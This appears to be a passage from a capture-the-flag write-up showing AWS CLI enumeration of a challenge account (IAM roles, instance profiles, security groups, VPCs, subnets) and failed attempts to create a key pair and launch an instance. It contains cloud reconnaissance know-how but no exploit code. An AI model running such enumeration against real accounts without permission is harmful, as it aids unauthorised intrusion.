            "CreateDate": "2022-04-04T08:49:38+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "backup.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Provides AWS Backup permission to create backups and perform restores on your behalf across AWS services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/ecs.application-autoscaling.amazonaws.com/",
            "RoleName": "AWSServiceRoleForApplicationAutoScaling_ECSService",
            "RoleId": "AROAQYDFBGMSYWTC7NWT2",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/ecs.application-autoscaling.amazonaws.com/AWSServiceRoleForApplicationAutoScaling_ECSService",
            "CreateDate": "2022-04-05T08:40:04+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
    "Roles": [
        {
            "Path": "/service-role/",
            "RoleName": "AWSBackupDefaultServiceRole",
            "RoleId": "AROAQYDFBGMSZL3H3GO7H",
            "Arn": "arn:aws:iam::051751498533:role/service-role/AWSBackupDefaultServiceRole",
            "CreateDate": "2022-04-04T08:49:38+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "backup.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Provides AWS Backup permission to create backups and perform restores on your behalf across AWS services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/ecs.application-autoscaling.amazonaws.com/",
            "RoleName": "AWSServiceRoleForApplicationAutoScaling_ECSService",
            "RoleId": "AROAQYDFBGMSYWTC7NWT2",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/ecs.application-autoscaling.amazonaws.com/AWSServiceRoleForApplicationAutoScaling_ECSService",
            "CreateDate": "2022-04-05T08:40:04+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ecs.application-autoscaling.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/autoscaling.amazonaws.com/",
            "RoleName": "AWSServiceRoleForAutoScaling",
            "RoleId": "AROAQYDFBGMS4MP6LHPP5",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling",
            "CreateDate": "2022-01-26T05:28:49+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "autoscaling.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Default Service-Linked Role enables access to AWS Services and Resources used or managed by Auto Scaling",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/backup.amazonaws.com/",
            "RoleName": "AWSServiceRoleForBackup",
            "RoleId": "AROAQYDFBGMSVCRSJJY6H",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/backup.amazonaws.com/AWSServiceRoleForBackup",
            "CreateDate": "2022-04-04T08:48:50+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "backup.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/ecs.amazonaws.com/",
            "RoleName": "AWSServiceRoleForECS",
            "RoleId": "AROAQYDFBGMSVMLCEWBCF",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/ecs.amazonaws.com/AWSServiceRoleForECS",
            "CreateDate": "2022-03-23T19:19:11+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ecs.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Role to enable Amazon ECS to manage your cluster.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/elasticache.amazonaws.com/",
            "RoleName": "AWSServiceRoleForElastiCache",
            "RoleId": "AROAQYDFBGMSSZ2SIGYG2",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/elasticache.amazonaws.com/AWSServiceRoleForElastiCache",
            "CreateDate": "2022-03-27T07:43:15+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "elasticache.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "This policy allows ElastiCache to manage AWS resources on your behalf as necessary for managing your cache.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/elasticloadbalancing.amazonaws.com/",
            "RoleName": "AWSServiceRoleForElasticLoadBalancing",
            "RoleId": "AROAQYDFBGMS7NWSKKIXS",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/elasticloadbalancing.amazonaws.com/AWSServiceRoleForElasticLoadBalancing",
            "CreateDate": "2022-01-26T06:38:44+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "elasticloadbalancing.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Allows ELB to call AWS services on your behalf.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/globalaccelerator.amazonaws.com/",
            "RoleName": "AWSServiceRoleForGlobalAccelerator",
            "RoleId": "AROAQYDFBGMS22KZIJ7RV",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/globalaccelerator.amazonaws.com/AWSServiceRoleForGlobalAccelerator",
            "CreateDate": "2022-03-27T09:20:41+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "globalaccelerator.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Allows Global Accelerator to call AWS services on customer's behalf",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/rds.amazonaws.com/",
            "RoleName": "AWSServiceRoleForRDS",
            "RoleId": "AROAQYDFBGMSQUMKE56M3",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS",
            "CreateDate": "2022-02-01T18:29:33+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "rds.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Allows Amazon RDS to manage AWS resources on your behalf",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/support.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleId": "AROAQYDFBGMSR5TXKZZ6B",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
            "CreateDate": "2022-01-26T04:43:09+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "support.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Enables resource access for AWS to provide billing, administrative and support services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleId": "AROAQYDFBGMSS5GZWA7HZ",
            "Arn": "arn:aws:iam::051751498533:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
            "CreateDate": "2022-01-26T04:43:09+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "trustedadvisor.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "ec2_agent_role",
            "RoleId": "AROAQYDFBGMSYSEMEVAEH",
            "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
            "CreateDate": "2022-07-22T09:29:34+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_development_role",
            "RoleId": "AROAQYDFBGMS2NDQR5JSE",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
            "CreateDate": "2022-07-22T09:29:34+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_webservice_role",
            "RoleId": "AROAQYDFBGMSTH7VQVGQC",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_webservice_role",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_cleaner_service_role",
            "RoleId": "AROAQYDFBGMSUI3AJILSK",
            "Arn": "arn:aws:iam::051751498533:role/lambda_cleaner_service_role",
            "CreateDate": "2022-07-22T09:29:34+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws iam list-instance-profiles
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_agent_instance_profile",
            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2_agent_role",
                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "CreateDate": "2022-07-22T09:29:34+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ 
```


## AWS Enum

#### EC2

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-security-groups
{
{
    "SecurityGroups": [
        {
            "Description": "Access to c2 infra",
            "GroupName": "default-agents-sg",
            "IpPermissions": [
                {
                    "FromPort": 0,
                    "IpProtocol": "tcp",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 65535,
                    "UserIdGroupPairs": []
                }
            ],
            "OwnerId": "051751498533",
            "GroupId": "sg-047c958320ee832f0",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-095cd9241e386169d"
        },
        ...
```


```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-route-tables                                                                                                                                 254 ⨯
{
    "RouteTables": [
        {
            "Associations": [
                {
                    "Main": false,
                    "RouteTableAssociationId": "rtbassoc-008d1bc16737a4873",
                    "RouteTableId": "rtb-0cc80fc5af7c8470c",
                    "SubnetId": "subnet-0aa6ecdf900166741",
                    "AssociationState": {
                        "State": "associated"
                    }
                }
            ],
            "PropagatingVgws": [],
            "RouteTableId": "rtb-0cc80fc5af7c8470c",
            "Routes": [
                {
                    "DestinationCidrBlock": "10.0.0.0/16",
                    "GatewayId": "local",
                    "Origin": "CreateRouteTable",
                    "State": "active"
                },
                {
                    "DestinationCidrBlock": "0.0.0.0/0",
                    "GatewayId": "igw-03460d3a3a232502d",
                    "Origin": "CreateRoute",
                    "State": "active"
                }
            ],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
{
    "RouteTables": [
        {
            "Associations": [
                {
                    "Main": false,
                    "RouteTableAssociationId": "rtbassoc-008d1bc16737a4873",
                    "RouteTableId": "rtb-0cc80fc5af7c8470c",
                    "SubnetId": "subnet-0aa6ecdf900166741",
                    "AssociationState": {
                        "State": "associated"
                    }
                }
            ],
            "PropagatingVgws": [],
            "RouteTableId": "rtb-0cc80fc5af7c8470c",
            "Routes": [
                {
                    "DestinationCidrBlock": "10.0.0.0/16",
                    "GatewayId": "local",
                    "Origin": "CreateRouteTable",
                    "State": "active"
                },
                {
                    "DestinationCidrBlock": "0.0.0.0/0",
                    "GatewayId": "igw-03460d3a3a232502d",
                    "Origin": "CreateRoute",
                    "State": "active"
                }
            ],
            "Tags": [
                {
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-vpcs        
{
    "Vpcs": [
        {
            "CidrBlock": "10.0.0.0/16",
            "DhcpOptionsId": "dopt-05dfce395f9d4f9bf",
            "State": "available",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "InstanceTenancy": "default",
            "CidrBlockAssociationSet": [
                {
                    "AssociationId": "vpc-cidr-assoc-020cb5d96555b92ff",
                    "CidrBlock": "10.0.0.0/16",
                    "CidrBlockState": {
                        "State": "associated"
                    }
                }
            ],
            "IsDefault": false,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ]
        }
    ]
}
```

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws ec2 describe-subnets
{
{
    "Subnets": [
        {
            "AvailabilityZone": "ap-southeast-1a",
            "AvailabilityZoneId": "apse1-az2",
            "AvailableIpAddressCount": 16378,
            "CidrBlock": "10.0.0.0/18",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ],
            "SubnetArn": "arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

#### IAM

```bash
┌──(kali㉿kali)-[/tmp/flag]
└─$ aws iam list-instance-profiles
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_agent_instance_profile",
            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2_agent_role",
                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "CreateDate": "2022-07-22T09:29:34+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
...
```


```bash
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws iam list-attached-user-policies --user-name user-a5df75ad1753434aa2db7dbe7d361b96                                                                         130 ⨯
{
    "AttachedPolicies": [
        {
            "PolicyName": "user-a5df75ad1753434aa2db7dbe7d361b96",
            "PolicyArn": "arn:aws:iam::051751498533:policy/user-a5df75ad1753434aa2db7dbe7d361b96"
        }
    ]
}
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$
```


## New instance

https://www.nakivo.com/blog/how-to-manage-aws-ec2-instances-via-aws-command-line-interface/

https://datawookie.dev/blog/2021/07/creating-an-ami-using-the-aws-cli/

```bash
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws ec2 create-key-pair --key-name MyKeyPair --output text > MyKeyPair.pem

An error occurred (UnauthorizedOperation) when calling the CreateKeyPair operation: You are not authorized to perform this operation. Encoded authorization failure message: 4HXhgA9lLfBo9ZUkJZ6edeNh6eVdwP8QooDjaahTNfRM-3Whu_HYVU1bbFpP2qe2Avz0g7tWTRgJXPUpA7Ijqs4WS7rXr69zOt0250oM-7Gel606SgEXSUvAbZhGizwCYi34JRRhvrGfbsMH44JKSHgrQlM_sjxtcIesPHVMUbyVe1ZwHRfN7X2WwVTbA4Ba_1RNfdh96QZb9R42hGE9cWuRP5mKPd0sTRqlG6HaeYjo-XUGYtL4H8IEMxQ9Mzzr5brIEZIhTc1ta7ltHH22Rz8SCT1iUL2wajccXBrANv4YySt3ye_hwREx8KBCn0QNGprW4WMNt4htnYlGfLr_gFm5S85skwPUCkxMoH-1WBxVe_shgupMpjZlTHdGVbm64Iy66Wb0UK5iq4e36fgsF0lYUbsHRi0tvSIK8KBM1N43a4qK-hfLVjYeBJykAlHhVAI9DCpykHf-7nlCBA21m_MWBh0230dsI2hCRb-FqAIkEWLtv5L0RLgWpC2syfQa3Ow8LRyWnGrlYFshaP7jNrqWalYgzmJ61C3AVqZH98NaS5xgDfqIeigT
                                                                                   
                                                                                   ┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro                                                                               127 ⨯

An error occurred (InvalidAMIID.Malformed) when calling the RunInstances operation: Invalid id: "ami-0abcdef1234567890" (expecting "ami-...")
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$ aws ec2 run-instances --image-id ami-05fa00d4c63e32376 --instance-type t2.micro                                                                               254 ⨯

An error occurred (UnauthorizedOperation) when calling the RunInstances operation: You are not authorized to perform this operation. Encoded authorization failure message: ZIBrm0fwEFupSiL9jZqKIdpFXNSIt1LLHQ2gYfMMSLw3gFZS_LPzuh1up-hHebh21K4wZE8qn7eAcS45S-xMMpAE1pNHJ690fL114gP-xDW2Ui55L0CWXz_EknkIeVqVkcvRwOwkokwCg36FtF-m-z89DcrwRvKZwUD_N250OBAR46zGAFv8sc92FI1NyGYTV-S7bpqJt2u-EbeEFPYW5Y8aA-fLLaW08IfYBlOOgboZD-UosC9k9IW4b664KGXZwzSRaF-T5MkbYrhbg8Qp_HQjmDShhjtaX2NgUyWizEsjWEb83bqTe8gYkOjVFjG8n_M-vlZujhvfZxms2_lAy4mTAaE7pHo7tbgT3OGh9Hbpv3LBtDjNo61hhom_nP4X7EHHrd5nILoQE8siAib79HLLlRJIdUHVkx8YHbIEZpFQrGlzBXS8fTuZ036XN8y7_vlfaoiwp2wrj1xeVbQTVlz8pfZe-v92dOfEbsondLHrpg50aDr5s0CUT9uMJ9FYvHcYLDVdkg2XRBbMe85CMN07cXCQ6v-y9D1QEOWw2rqFhpLOLGuaZOKmMcCZaxVJnO_RHURSRADytZGV7Mxy6p99_WALAsg9aYPARIG8h9ijvcK0bh0jHEA1OU09IAqcT0puxIeeYk1KXi3Bsl2Mhm1WU9ovvEB1Wmur0S3Ia9PqAieJLnLtXxs9iTu-RSHr
                                                                                                                                                                        
┌──(weirdAAL)(kali㉿kali)-[/tmp/AWS]
└─$                
```


# Flag